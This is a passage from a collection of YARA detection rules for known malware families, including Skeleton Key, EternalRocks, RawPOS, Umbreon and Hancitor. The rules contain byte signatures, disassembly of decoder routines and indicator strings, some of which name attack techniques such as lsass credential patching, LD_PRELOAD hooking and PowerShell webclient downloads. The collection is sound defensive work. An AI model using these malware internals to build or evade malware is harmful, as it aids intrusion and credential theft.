89 45 F8 mov [ebp+var _ 8], eax
8B 45 10 mov eax, [ebp+arg _ 8]
C1 E8 02 shr eax, 2
39 45 F8 cmp [ebp+var _ 8], eax
73 17 jnb short loc _ 4013ED
8B 45 F8 mov eax, [ebp+var _ 8]
8B 4D F4 mov ecx, [ebp+var _ C]
8B 04 81 mov eax, [ecx+eax*4]
33 45 20 xor eax, [ebp+arg _ 18]
8B 4D F8 mov ecx, [ebp+var _ 8]
8B 55 F4 mov edx, [ebp+var _ C]
89 04 8A mov [edx+ecx*4], eax
EB D7 jmp short loc _ 4013C4
83 65 F8 00 and [ebp+var _ 8], 0
83 65 EC 00 and [ebp+var _ 14], 0
EB 0E jmp short loc _ 401405
8B 45 F8 mov eax, [ebp+var _ 8]
40 inc eax
89 45 F8 mov [ebp+var _ 8], eax
8B 45 EC mov eax, [ebp+var _ 14]
40 inc eax
89 45 EC mov [ebp+var _ 14], eax
8B 45 EC mov eax, [ebp+var _ 14]
3B 45 10 cmp eax, [ebp+arg _ 8]
73 27 jnb short loc _ 401434
8B 45 F4 mov eax, [ebp+var _ C]
03 45 F8 add eax, [ebp+var _ 8]
8B 4D F4 mov ecx, [ebp+var _ C]
03 4D EC add ecx, [ebp+var _ 14]
8A 09 mov cl, [ecx]
88 08 mov [eax], cl
8B 45 F8 mov eax, [ebp+var _ 8]
33 D2 xor edx, edx
6A 0F push 0Fh
59 pop ecx
F7 F1 div ecx
85 D2 test edx, edx
75 07 jnz short loc _ 401432
*/
$code1b = { 8B 45 F8 40 89 45 F8 8B 45 10 C1 E8 02
39 45 F8 73 17 8B 45 F8 8B 4D F4 8B 04 81 33 45 20
8B 4D F8 8B 55 F4 89 04 8A EB D7 83 65 F8 00 83 65
EC 00 EB 0E 8B 45 F8 40 89 45 F8 8B 45 EC 40 89 45
EC 8B 45 EC 3B 45 10 73 27 8B 45 F4 03 45 F8 8B 4D
F4 03 4D EC 8A 09 88 08 8B 45 F8 33 D2 6A 0F 59 F7
F1 85 D2 75 07 }
/*
8A 04 0F mov al, [edi+ecx]
88 04 0E mov [esi+ecx], al
6A 0F push 0Fh
33 D2 xor edx, edx
8B C6 mov eax, esi
5B pop ebx
F7 F3 div ebx
85 D2 test edx, edx
75 01 jnz short loc _ B12FC
47 inc edi
8B 45 14 mov eax, [ebp+arg _ C]
46 inc esi
47 inc edi
3B F8 cmp edi, eax
72 E3 jb short loc _ B12E8
EB 04 jmp short loc _ B130B
C6 04 08 00 mov byte ptr [eax+ecx], 0
48 dec eax
3B C6 cmp eax, esi
73 F7 jnb short loc _ B1307
33 C0 xor eax, eax
C1 EE 02 shr esi, 2
74 0B jz short loc _ B1322
8B 55 18 mov edx, [ebp+arg _ 10]
31 14 81 xor [ecx+eax*4], edx
40 inc eax
3B C6 cmp eax, esi
72 F5 jb short loc _ B1317
*/
$code1c = { 8A 04 0F 88 04 0E 6A 0F 33 D2 8B C6 5B F7 F3
85 D2 75 01 47 8B 45 14 46 47 3B F8 72 E3 EB 04 C6 04 08
00 48 3B C6 73 F7 33 C0 C1 EE 02 74 0B 8B 55 18 31 14 81
40 3B C6 72 F5}
/*
29 5D 0C sub [ebp+arg _ 4], ebx
8B D1 mov edx, ecx
C1 EA 05 shr edx, 5
2B CA sub ecx, edx
8B 55 F4 mov edx, [ebp+var _ C]
2B C3 sub eax, ebx
3D 00 00 00 01 cmp eax, 1000000h
89 0F mov [edi], ecx
8B 4D 10 mov ecx, [ebp+arg _ 8]
8D 94 91 00 03 00 00 lea edx, [ecx+edx*4+300h]
73 17 jnb short loc _ 9FC44
8B 7D F8 mov edi, [ebp+var _ 8]
8B 4D 0C mov ecx, [ebp+arg _ 4]
0F B6 3F movzx edi, byte ptr [edi]
C1 E1 08 shl ecx, 8
0B CF or ecx, edi
C1 E0 08 shl eax, 8
FF 45 F8 inc [ebp+var _ 8]
89 4D 0C mov [ebp+arg _ 4], ecx
8B 0A mov ecx, [edx]
8B F8 mov edi, eax
C1 EF 0B shr edi, 0Bh
*/
$code2 = { 29 5D 0C 8B D1 C1 EA 05 2B CA 8B 55 F4 2B C3
3D 00 00 00 01 89 0F 8B 4D 10 8D 94 91 00 03 00 00 73 17
8B 7D F8 8B 4D 0C 0F B6 3F C1 E1 08 0B CF C1 E0 08 FF 45
F8 89 4D 0C 8B 0A 8B F8 C1 EF 0B}
condition:
($mz at 0) and (($code1a or $code1b or $code1c) and $code2)
}
rule SSC_FE_APT_9002_rat
{
meta:
author = "FireEye Labs"
strings:
$mz = {4d 5a}
$a = "rat_UnInstall" wide ascii
condition:
($mz at 0) and $a
}
rule SSC_KeyBoy_Dropper
{
meta:
author = "Rapid7 Labs"
reference = "https://community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india"
strings:
$1 = "I am Admin"
$2 = "I am User"
$3 = "Run install success!"
$4 = "Service install success!"
$5 = "Something Error!"
$6 = "Not Configed, Exiting"
condition:
all of them
}
rule SSC_KeyBoy_Backdoor
{
meta:
author = "Rapid7 Labs"
reference = "https://community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india"
strings:
$1 = "$login$"
$2 = "$sysinfo$"
$3 = "$shell$"
$4 = "$fileManager$"
$5 = "$fileDownload$"
$6 = "$fileUpload$"
condition:
all of them
}
rule SSC_OrcaRAT
{
meta:
author = "PwC Cyber Threat Operations   :: @tlansec"
distribution = "TLP WHITE"
sha1 =   "253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613"
strings:
$MZ="MZ"
$apptype1="application/x-ms-application"
$apptype2="application/x-ms-xbap"
$apptype3="application/vnd.ms-xpsdocument"
$apptype4="application/xaml+xml"
$apptype5="application/x-shockwave-flash"
$apptype6="image/pjpeg"
$err1="Set return time error =   %d!"
$err2="Set return time   success!"
$err3="Quit success!"
condition:
$MZ at 0 and filesize < 500KB and   (all of ($apptype*) and 1 of ($err*))
}
rule SSC_skeleton_key_injected_code
{
strings:
$injected = { 33 C0 85 C9 0F 95 C0 48 8B 8C 24 40 01 00 00 48 33 CC E8 4D 02 00
00 48 81 C4 58 01 00 00 C3 }
$patch_CDLocateCSystem = { 48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 20 48 8B FA
8B F1 E8 ?? ?? ?? ?? 48 8B D7 8B CE 48 8B D8 FF 50 10 44 8B D8 85 C0 0F 88 A5 00
00 00 48 85 FF 0F 84 9C 00 00 00 83 FE 17 0F 85 93 00 00 00 48 8B 07 48 85 C0 0F
84 84 00 00 00 48 83 BB 48 01 00 00 00 75 73 48 89 83 48 01 00 00 33 D2 }
$patch_SamIRetrievePrimaryCredential = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74
24 18 57 48 83 EC 20 49 8B F9 49 8B F0 48 8B DA 48 8B E9 48 85 D2 74 2A 48 8B 42
08 48 85 C0 74 21 66 83 3A 26 75 1B 66 83 38 4B 75 15 66 83 78 0E 73 75 0E 66 83
78 1E 4B 75 07 B8 A1 02 00 C0 EB 14 E8 ?? ?? ?? ?? 4C 8B CF 4C 8B C6 48 8B D3 48
8B CD FF 50 18 48 8B 5C 24 30 48 8B 6C 24 38 48 8B 74 24 40 48 83 C4 20 5F C3 }
$patch_SamIRetrieveMultiplePrimaryCredential  = { 48 89 5C 24 08 48 89 6C 24 10
48 89 74 24 18 57 48 83 EC 20 41 8B F9 49 8B D8 8B F2 8B E9 4D 85 C0 74 2B 49 8B
40 08 48 85 C0 74 22 66 41 83 38 26 75 1B 66 83 38 4B 75 15 66 83 78 0E 73 75 0E
66 83 78 1E 4B 75 07 B8 A1 02 00 C0 EB 12 E8 ?? ?? ?? ?? 44 8B CF 4C 8B C3 8B D6
8B CD FF 50 20 48 8B 5C 24 30 48 8B 6C 24 38 48 8B 74 24 40 48 83 C4 20 5F C3 }
condition:
any of them
}
rule SSC_skeleton_key_patcher
{
strings:
$target_process = "lsass.exe" wide
$dll1 = "cryptdll.dll"
$dll2 = "samsrv.dll"
$name = "HookDC.dll"
$patched1 = "CDLocateCSystem"
$patched2 = "SamIRetrievePrimaryCredentials"
$patched3 = "SamIRetrieveMultiplePrimaryCredentials"
condition:
all of them
}
rule SSC_APT_NGO_wuaclt
{
strings:
$a = "%%APPDATA%%\\Microsoft\\wuauclt\\wuauclt.dat"
$b = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
$c = "/news/show.asp?id%d=%d"
$d = "%%APPDATA%%\\Microsoft\\wuauclt\\"
$e = "0l23kj@nboxu"
$f = "%%s.asp?id=%%d&Sid=%%d"
$g = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SP Q%%d)"
$h = "Cookies: UseID=KGIOODAOOK%%s"
condition:
($a and $b and $c) or ($d and $e) or ($f and $g and $h)
}
rule SSC_APT_NGO_wuaclt_PDF
{
strings:
$pdf  = "%PDF" nocase
$comment = {3C 21 2D 2D 0D 0A 63 57 4B 51 6D 5A 6C 61 56 56 56 56 56 56 56 56 56 56 56 56 56 63 77 53 64 63 6A 4B 7A 38 35 6D 37 4A 56 6D 37 4A 46 78 6B 5A 6D 5A 6D 52 44 63 5A 58 41 73 6D 5A 6D 5A 7A 42 4A 31 79 73 2F 4F 0D 0A}
condition:
$pdf at 0 and $comment in (0..200)
}
rule SSC_onimiki
{
meta:
description = "Linux/Onimiki malicious DNS server"
malware = "Linux/Onimiki"
operation = "Windigo"
author = "Olivier Bilodeau <bilodeau@eset.com>"
created = "2014-02-06"
reference = "http://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf"
contact = "windigo@eset.sk"
source = "https://github.com/eset/malware-ioc/"
license = "BSD 2-Clause"
strings:
// code from offset: 0x46CBCD
$a1 = {43 0F B6 74 2A 0E 43 0F  B6 0C 2A 8D 7C 3D 00 8D}
$a2 = {74 35 00 8D 4C 0D 00 89  F8 41 F7 E3 89 F8 29 D0}
$a3 = {D1 E8 01 C2 89 F0 C1 EA  04 44 8D 0C 92 46 8D 0C}
$a4 = {8A 41 F7 E3 89 F0 44 29  CF 29 D0 D1 E8 01 C2 89}
$a5 = {C8 C1 EA 04 44 8D 04 92  46 8D 04 82 41 F7 E3 89}
$a6 = {C8 44 29 C6 29 D0 D1 E8  01 C2 C1 EA 04 8D 04 92}
$a7 = {8D 04 82 29 C1 42 0F B6  04 21 42 88 84 14 C0 01}
$a8 = {00 00 42 0F B6 04 27 43  88 04 32 42 0F B6 04 26}
$a9 = {42 88 84 14 A0 01 00 00  49 83 C2 01 49 83 FA 07}
condition:
all of them
}
rule SSC_glassRAT
{
meta:
author = "RSA RESEARCH"
date = "3 Nov 2015"
description = "Detects GlassRAT by RSA (modified by Florian Roth - speed improvements)"
Info = "GlassRat"
/* MD5s
37adc72339a0c2c755e7fef346906330
59b404076e1af7d0faae4a62fa41b69f
5c17395731ec666ad0056d3c88e99c4d
e98027f502f5acbcb5eda17e67a21cdc
87a965cf75b2da112aea737220f2b5c2
22e01495b4419b564d5254d2122068d9
42b57c0c4977a890ecb0ea9449516075
b7f2020208ebd137616dadb60700b847	*/
strings:
$bin1 = {85 C0 B3 01} 		/* 	test    eax, eax
mov     bl, 1 */
// $bin2 = {34 02}				// xor     al, 2 ---> XOR key for rundll32.exe
$bin3 = {68 4C 50 00 10}	// push    offset KeyName  ; "2"
$bin4 = {68 48 50 00 10}	// push    offset a3       ; "3"
$bin5 = {68 44 50 00 10}	// push    offset a4       ; "4"
$hs = {CB FF 5D C9 AD 3F 5B A1 54 13 FE FB 05 C6 22}  // Initial Handshake ---> can be added or removed for hunting for different variants
//$re1  = {50 00 00 00}
//$re2  = {BB 01 00 00}
// Dwords of C2 Ports (80 | 443 | 53) 2 -3 times
$s1 = "pwlfnn10,gzg" // rundll32.exe XOR 02
$s2 = "AddNum"
$s3 = "ServiceMain"
$s4 = "The Window"
$s5 = "off.dat"
condition:
all of ($bin*) and $hs and 3 of ($s*) //The conditions can be adjusted for hunting for different variants
}
rule SSC_mumblehard_packer
{
meta:
description = "Mumblehard i386 assembly code responsible for decrypting Perl code"
author = "Marc-Etienne M.Lveill"
date = "2015-04-07"
reference = "http://www.welivesecurity.com"
version = "1"
strings:
$decrypt = { 31 db  [1-10]  ba ?? 00 00 00  [0-6]  (56 5f |  89 F7)
39 d3 75 13 81 fa ?? 00 00 00 75 02 31 d2 81 c2 ?? 00 00
00 31 db 43 ac 30 d8 aa 43 e2 e2 }
condition:
$decrypt
}
rule SSC_moose
{
meta:
Author      = "Thomas Dupuy"
Date        = "2015/04/21"
Description = "Linux/Moose malware"
Reference   = "http://www.welivesecurity.com/wp-content/uploads/2015/05/Dissecting-LinuxMoose.pdf"
Source = "https://github.com/eset/malware-ioc/"
Contact = "github@eset.com"
License = "BSD 2-Clause"
strings:
$header = { 7F 45 4C 46 }
$s0 = "Status: OK"
$s1 = "--scrypt"
$s2 = "stratum+tcp://"
$s3 = "cmd.so"
$s4 = "/Challenge"
$s7 = "processor"
$s9 = "cpu model"
$s21 = "password is wrong"
$s22 = "password:"
$s23 = "uthentication failed"
$s24 = "sh"
$s25 = "ps"
$s26 = "echo -n -e "
$s27 = "chmod"
$s28 = "elan2"
$s29 = "elan3"
$s30 = "chmod: not found"
$s31 = "cat /proc/cpuinfo"
$s32 = "/proc/%s/cmdline"
$s33 = "kill %s"
condition:
$header at 0 and all of ($s*)
}
rule SSC_buhtrapknock {
meta:
author = "Curt Wilson"
org    = "Arbor Networks ASERT"
hash   = "a0c428ae70bfc7fff66845698fb8ce045bffb3114dde4ea2eac19561a619c6c8"
desc   = "connects to C2 and issues HTTP client request for knock.html"
strings:
$s1 = "C:\\Users\\dev\\Documents\\Visual Studio 2015\\Projects\\knock\\Release\\knock.pdb" ascii wide
$s2 = "User-Agent: Mozilla/5.0 (compatible; MSIE 273.0; Windows NT 6.1; WOW64; Trident/5.0; MASP)" ascii wide
$s3 = "/knock.html" ascii wide
condition:
uint16(0) == 0x5a4d and 2 of ($s*)
}
rule SSC_explosive_exe
{
meta:
author = "Check Point Software Technologies Inc."
info = "Explosive EXE"
strings:
$MZ = "MZ"
$DLD_S = "DLD-S:"
$DLD_E = "DLD-E:"
condition:
$MZ at 0 and all of them
}
rule SSC_MiSType_Backdoor_Packed
{
meta:
author = "Cylance SPEAR Team"
note = "Probably Prone to False Positive"
strings:
$upx = {33 2E 30 33 00 55 50 58 21}
$send_httpquery = {00 00 00 48 74 74 70 51 75 65 72 79 49 6E 66 6F 41 00 00 73 65 6E 64 00 00}
$delphi_sec_pe = {50 45 00 00 4C 01 03 00 19 5E 42 2A}
condition:
filesize < 100KB and $upx and $send_httpquery and $delphi_sec_pe
}
rule SSC_Misdat_Backdoor_Packed
{
meta:
author = "Cylance SPEAR Team"
note = "Probably Prone to False Positive"
strings:
$upx = {33 2E 30 33 00 55 50 58 21}
$send = {00 00 00 73 65 6E 64 00 00 00}
$delphi_sec_pe = {50 45 00 00 4C 01 03 00 19 5E 42 2A}
$shellexec = {00 00 00 53 68 65 6C 6C 45 78 65 63 75 74 65 57 00 00 00}
condition:
filesize < 100KB and $upx and $send and $delphi_sec_pe and $shellexec
}
rule SSC_Zlib_Backdoor
{
meta:
author = "Cylance SPEAR Team"
/* String
C7 45 FC 00 04 00 00    	  mov     [ebp+Memory], 400h
C6 45 D8 50                   mov     [ebp+Str], 'P'
C6 45 D9 72                   mov     [ebp+var_27], 'r'
C6 45 DA 6F                   mov     [ebp+var_26], 'o'
C6 45 DB 78                   mov     [ebp+var_25], 'x'
C6 45 DC 79                   mov     [ebp+var_24], 'y'
C6 45 DD 2D                   mov     [ebp+var_23], '-'
C6 45 DE 41                   mov     [ebp+var_22], 'A'
C6 45 DF 75                   mov     [ebp+var_21], 'u'
C6 45 E0 74                   mov     [ebp+var_20], 't'
C6 45 E1 68                   mov     [ebp+var_1F], 'h'
C6 45 E2 65                   mov     [ebp+var_1E], 'e'
C6 45 E3 6E                   mov     [ebp+var_1D], 'n'
C6 45 E4 74                   mov     [ebp+var_1C], 't'
C6 45 E5 69                   mov     [ebp+var_1B], 'i'
C6 45 E6 63                   mov     [ebp+var_1A], 'c'
C6 45 E7 61                   mov     [ebp+var_19], 'a'
C6 45 E8 74                   mov     [ebp+var_18], 't'
C6 45 E9 65                   mov     [ebp+var_17], 'e'
C6 45 EA 3A                   mov     [ebp+var_16], ':'
C6 45 EB 20                   mov     [ebp+var_15], ' '
C6 45 EC 4E                   mov     [ebp+var_14], 'N'
C6 45 ED 54                   mov     [ebp+var_13], 'T'
C6 45 EE 4C                   mov     [ebp+var_12], 'L'
C6 45 EF 4D                   mov     [ebp+var_11], 'M'
C6 45 F0 20                   mov     [ebp+var_10], ' '
*/
strings:
$auth = {C6 45 D8 50 C6 45 D9 72 C6 45 DA 6F C6 45 DB 78 C6 45 DC 79 C6 45 DD 2D}
$auth2 = {C7 45 FC 00 04 00 00 C6 45 ?? 50 C6 45 ?? 72 C6 45 ?? 6F}
$ntlm = "NTLM" wide
condition:
($auth or $auth2) and $ntlm
}
rule SSC_Misdat_Backdoor
{
meta:
author = "Cylance SPEAR Team"
/* Decode Function
CODE:00406C71 8B 55 F4					mov     edx, [ebp+var_C]
CODE:00406C74 8A 54 1A FF				mov     dl, [edx+ebx-1]
CODE:00406C78 8B 4D F8					mov     ecx, [ebp+var_8]
CODE:00406C7B C1 E9 08 					shr     ecx, 8
CODE:00406C7E 32 D1						xor     dl, cl
CODE:00406C80 88 54 18 FF				mov     [eax+ebx-1], dl
CODE:00406C84 8B 45 F4					mov     eax, [ebp+var_C]
CODE:00406C87 0F B6 44 18 FF			movzx   eax, byte ptr [eax+ebx-1]
CODE:00406C8C 03 45 F8					add     eax, [ebp+var_8]
CODE:00406C8F 69 C0 D9 DB 00 00  		imul    eax, 0DBD9h
CODE:00406C95 05 3B DA 00 00 			add     eax, 0DA3Bh
CODE:00406C9A 89 45 F8 					mov     [ebp+var_8], eax
CODE:00406C9D 43 						inc     ebx
CODE:00406C9E 4E 						dec     esi
CODE:00406C9F 75 C9 					jnz     short loc_406C6A
*/
strings:
$imul = {03 45 F8 69 C0 D9 DB 00 00 05 3B DA 00 00}
$delphi = {50 45 00 00 4C 01 08 00 19 5E 42 2A}
condition:
$imul and $delphi
}
rule SSC_SType_Backdoor
{
meta:
author = "Cylance SPEAR Team"
/* Decode Function
8B 1A		mov     ebx, [edx]
8A 1B		mov     bl, [ebx]
80 EB 02	sub     bl, 2
8B 74 24 08 mov     esi, [esp+14h+var_C]
32 1E		xor     bl, [esi]
8B 31		mov     esi, [ecx]
88 1E		mov     [esi], bl
8B 1A		mov     ebx, [edx]
43			inc     ebx
89 1A		mov     [edx], ebx
8B 19		mov     ebx, [ecx]
43			inc     ebx
89 19		mov     [ecx], ebx
48			dec     eax
75 E2		jnz     short loc_40EAC6
*/
strings:
$stype = "stype=info&data="
$mmid = "?mmid="
$status = "&status=run succeed"
$mutex = "_KB10B2D1_CIlFD2C"
$decode = {8B 1A 8A 1B 80 EB 02 8B 74 24 08 32 1E 8B 31 88 1E 8B 1A 43}
condition:
$stype or ($mmid and $status) or $mutex or $decode
}
rule SSC_EternalRocks_shadowbrokers
{
strings:
$s0 = "eternalblue" fullword ascii
$s1 = "eternalchampion" fullword ascii
$s2 = "eternalromance" fullword ascii
$s3 = "eternalsynergy" fullword ascii
$s4 = "shellcode" ascii
$s5 = ".inconfig.xml" ascii
condition:
uint16(0) == 0x4b50 and all of them
}
rule SSC_EternalRocks_UpdateInstaller
{
strings:
$s0 = "C:\\Users\\tmc\\Documents\\" ascii
$s1 = "C:\\Users\\tmc\\Documents\\" wide
$s2 = "20b70e57-1c2e-4de9-99e5-69f369006912" fullword wide
$s3 = "{8F6F0AC4-B9A1-45fd-A8CF-727220DE8F}" fullword wide
$s4 = "ubgdgno5eswkhmpy.onion" fullword wide
$s5 = "Wrote SVCHOST to File System" fullword wide
$s6 = "Going to copy SharpZLib now" fullword wide
$s7 = "Already Copied Task Scheduler" fullword wide
$s8 = "required.glo" fullword wide
$s9 = "\\Tor\\tor.exe \"Microsoft Update Installer\" ENABLE" fullword wide
$s10 = "C:\\Program Files\\Microsoft Updates" fullword wide
$s11 = "MicroBotMassiveNet" fullword ascii
condition:
uint16(0) == 0x5a4d and 2 of them
}
rule SSC_EternalRocks_svchost
{
strings:
$s0 = "Microsoft.Win32.TaskScheduler" fullword ascii
$s1 = "svchost.exe" fullword ascii
$s2 = "svchost.exe" fullword wide
$s3 = "ConfusedByAttribute" fullword ascii
$s4 = "ICSharpCode.SharpZipLib" fullword ascii
$s5 = "Microsoft 2017" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_EternalRocks_TorUnzip
{
strings:
$s0 = "c:\\Program Files\\Microsoft Updates\\temp\\tor.zip" wide
$s1 = "C:\\Users\\tmc\\Documents\\TorUnzip\\Project1.vbp" wide
$s2 = "TorUnzip" fullword ascii
$s3 = "WindowsUnZip" fullword ascii
condition:
uint16(0) == 0x5a4d and 3 of them
}
rule SSC_EternalRocks_taskhost_final
{
strings:
$s0 = "EternalRocks" fullword wide
$s1 = "EternalRocks" fullword ascii
$s2 = "20D5CCEE9C91A1E61F72F46FA117B93FB006DB51" fullword ascii
$s5 = "4086658a-cbbb-11cf-b604-00c04fd8d565" fullword ascii
condition:
uint16(0) == 0x5a4d and 3 of them
}
rule SSC_APT32_ActiveMime_Lure {
meta:
filetype="MIME entity"
author="Ian Ahl (@TekDefense) and Nick Carr (@ItsReallyNick)"
date="2017-03-02"
description="Developed to detect APT32 (OceanLotus group) phishing lures used to target FireEye customers in 2016 and 2017"
strings:
$a1= "office_text" wide ascii
$a2= "schtasks /create /tn" wide ascii
$a3= "scrobj.dll" wide ascii
$a4= "new-object net.webclient" wide ascii
$a5= "GetUserName" wide ascii
$a6= "WSHnet.UserDomain" wide ascii
$a7= "WSHnet.UserName" wide ascii
condition:
4 of them
}
rule SSC_Lionrock_Loader
{
strings:
$a = "sfarfdk|amiqd|s"
$b = "s1-s{wlsz,s"
$c = "q}llyer|eldll"
condition:
($a and $b) or $c
}
rule SSC_Lionrock_Powershell
{
strings:
$http = "hffbZ]]"
$geo = "www\\ue}qifies\\xb]"
condition:
$http or $geo
}
rule SSC_Lionrock_Backdoor
{
strings:
$a = "windows\\currentversion\\run;reglist"
$power = "b}wershell\\eje@M|}br}tile@)|v}yeM1}mma|d@Msqribfpl}qy{DbafhOUEsU[DdafaO5efM1}|fe|f@Dbafh[t}reaqhHDqmd@i|@DdafaI{iej@Dqmd[oo"              $b = "agf}ejeqdir"
$c = "sfarfdk|amiqd|s"
condition:
$power or $b or ($a and $c)
}
rule SSC_Typhoon_Downloader
{
strings:
$ps = "<<<:resource"
$exp = "start_adobeup"
$e = "W78D432S34A9"
$f = "!SJ1B0RSWRKK"
$b = "wyy}EBB"
$geo = "hhhCjzbnvyvzlCg}B"
condition:
$ps or $exp or ($e and $f) or $b or $geo
}
rule SSC_PoS_Malware_RawPOS2015_dumper : RawPOS2015_dumper
{
meta:
author = "Trend Micro, Inc."
date = "2015-03-10"
description = "Used to detect RawPOS RAM dumper, including 2015 sample set"
sample_filetype = "exe"
strings:
$string1 = "(1[0-2]))([0-9]"
$string2 = "(1[0-2]))[0-9]{8,30})"
$string3 = "((B(([0-9]{13,16})"
$mess1 = "Found track data at %s with PID %d"
$mess2 = "Enter Process Id: "
$mess3 = " Dump private process memory by PID"
$mess4 = "Dumping private memory for pid %s to %s.dmp..."
$mess5 = " Full private dump of all running processes"
$memd1 = "memdump\\%s-%d.dmp"
$memd2 = "mkdir memdump >NUL 2>NUL"
condition:
(all of ($memd*)) and (all of ($mess*)) and (any of ($string*))
}
rule SSC_rawpos_service
{
meta:
description = "RAW.Pos is a fairly prevalent memory scraper that has been seen on a number of cases. This detection discovers the service component to this malware family."
category = "Point of Sale"
author = "Josh Grunzweig"
strings:
$string1 = "install"
$string2 = "remove"
$string3 = "debug"
$string4 = "SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\%s"
$string5 = "\\\\.\\pipe\\susrv"
$cmd = /start \/min \w+\.exe/
condition:
all of ($string*) and #cmd > 1
}
rule SSC_PoS_Malware_RawPOS2015_dumper_old : RawPOS2015_dumper_old
{
meta:
author = "Trend Micro, Inc."
date = "2015-03-10"
description = "Used to detect RawPOS memory dumper, pre-2012"
sample_filetype = "exe"
strings:
$string0 = " Full private dump of all running processes"
$string1 = " show info on Process like Path"
$string2 = " Show this help"
$string3 = " List all running processes"
$string4 = "Dumping private memory for pid %s to %s.dmp..."
$string5 = "%s-%d.dmp"
$string6 = "memdump\\%s-%d.dmp"
$string7 = "del memdump\\"
$string8 = "Process Memory Dumper"
$string9 = "Base size: %u"
$string10 = "Module ID: %u"
$string11 = "Hex: %xh"
condition:
all of ($string*)
}
rule SSC_rawpos
{
meta:
description = "RAW.Pos is a fairly prevalent memory scraper that has been seen on a number of cases"
category = "Point of Sale"
author = "Josh Grunzweig"
strings:
$_main = { 55 8B EC 81 C4 00 F8 FF FF 53 56 57 8B 75 0C 6A 00 E8 0A 09 00 00 59 6A ?? E8 ?? B0 00 00 59 FF 36 68 ?? ?? ?? ?? 8D 85 00 F8 FF FF 50 E8 ?? ?? ?? ?? 83 C4 0C 8D 95 00 F8 FF FF 52 E8 ?? B0 00 00 59 6A 00 E8 ?? 9D 00 00 }
$string1 = "cmd /C start %s"
$string2 = "pid-%s.dmp"
$string3 = "Dumping private memory for pid %s to %s.dmp..."
$string4 = "Process Memory Dumper"
$string5 = "Made By: DiabloHorn (Proud Member of: KD-Team)"
$string6 = "Found track data at %s with PID %d!"
$string7 = "memdump\\data-%s-%d.dmp"
condition:
$_main or all of ($string*)
}
rule SSC_Molerats_certs
{
meta:
author = "FireEye Labs"
description = "this rule detections code signed with certificates used by the Molerats actor"
strings:
$cert1 = {06 50 11 A5 BC BF 83 C0 93 28 16 5E 7E 85 27 75}
$cert2 = {03 e1 e1 aa a5 bc a1 9f ba 8c 42 05 8b 4a bf 28}
$cert3 = {0c c0 35 9c 9c 3c da 00 d7 e9 da 2d c6 ba 7b 6d}
condition:
1 of ($cert*)
}
rule SSC_tofsee
{
meta:
author="akrasuski1"
strings:
$decryptStr = {32 55 14	88 10 8A D1 02 55 18 F6 D9 00 55 14}
$xorGreet = {C1 EB 03 C0 E1 05 0A D9 32 DA 34 C6 88 1E}
$xorCrypt = {F7 FB 8A 44 0A 04 30 06 FF 41 0C}
$string_res1 = "loader_id"
$string_res2 = "born_date"
$string_res3 = "work_srv"
$string_res4 = "flags_upd"
$string_res5 = "lid_file_upd"
$string_res6 = "localcfg"
$string_var0 = "%RND_NUM"
$string_var1 = "%SYS_JR"
$string_var2 = "%SYS_N"
$string_var3 = "%SYS_RN"
$string_var4 = "%RND_SPACE"
$string_var5 = "%RND_DIGIT"
$string_var6 = "%RND_HEX"
$string_var7 = "%RND_hex"
$string_var8 = "%RND_char"
$string_var9 = "%RND_CHAR"
condition:
(7 of ($string_var*) and 4 of ($string_res*))
or
(7 of ($string_var*) and 2 of ($decryptStr, $xorGreet, $xorCrypt))
or
(4 of ($string_res*) and 2 of ($decryptStr, $xorGreet, $xorCrypt))
}
rule SSC_crime_linux_umbreon : rootkit
{
meta:
description = "Catches Umbreon rootkit"
reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/pokemon-themed-umbreon-linux-rootkit-hits-x86-arm-systems"
author = "Fernando Merces, FTR, Trend Micro"
date = "2016-08"
strings:
$ = { 75 6e 66 75 63 6b 5f 6c 69 6e 6b 6d 61 70 }
$ = "unhide.rb" ascii fullword
$ = "rkit" ascii fullword
condition:
uint32(0) == 0x464c457f // Generic ELF header
and uint8(16) == 0x0003 // Shared object file
and all of them
}
rule SSC_crime_linux_umbreon_espeon : rootkit backdoor
{
meta:
description = "Catches Umbreon strace rootkit component"
reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/pokemon-themed-umbreon-linux-rootkit-hits-x86-arm-systems"
author = "Fernando Merces, FTR, Trend Micro"
date = "2016-08"
strings:
$ = "Usage: %s [interface]" fullword
$ = "Options:" fullword
$ = "    interface    Listen on <interface> for packets." fullword
$ = "/bin/espeon-shell %s %hu"
$ = { 66 75 63 6b 20 6f 66 66 20 63 75 6e 74 }
$ = "error: unrecognized command-line options" fullword
condition:
uint32(0) == 0x464c457f // Generic ELF header
and uint8(16) == 0x0002 // Executable file
and all of them
}
rule SSC_crime_linux_umbreon_strace : rootkit
{
meta:
description = "Catches Umbreon strace rootkit component"
reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/pokemon-themed-umbreon-linux-rootkit-hits-x86-arm-systems"
author = "Fernando Merces, FTR, Trend Micro"
date = "2016-08"
strings:
$ = "LD_PRELOAD" fullword
$ = /ld\.so\.[a-zA-Z0-9]{7}/ fullword
$ = "\"/etc/ld.so.preload\"" fullword
$ = "fputs_unlocked" fullword
condition:
uint32(0) == 0x464c457f // Generic ELF header
and uint8(16) == 0x0003 // Shared object file
and all of them
}
rule SSC_Dropper_Hancitor {
meta:
authors = "Nick Hoffman & Jeremy Humble - Morphick Inc."
last_update = "2016-08-19"
description = "rule to find unpacked Hancitor, useful against memory dumps"
hash = "587a530cc82ff01d6b2d387d9b558299b0eb36e7e2c274cd887caa39fcc47c6f"
strings:
/*
.text:00401C02 83 FA 3A                                      cmp     edx, ':'
.text:00401C05 75 6B                                         jnz     short loc_401C72
.text:00401C07 B8 01 00 00 00                                mov     eax, 1
.text:00401C0C 6B C8 00                                      imul    ecx, eax, 0
.text:00401C0F 8B 55 08                                      mov     edx, [ebp+arg_0]
.text:00401C12 0F BE 04 0A                                   movsx   eax, byte ptr [edx+ecx]
.text:00401C16 83 F8 72                                      cmp     eax, 'r'
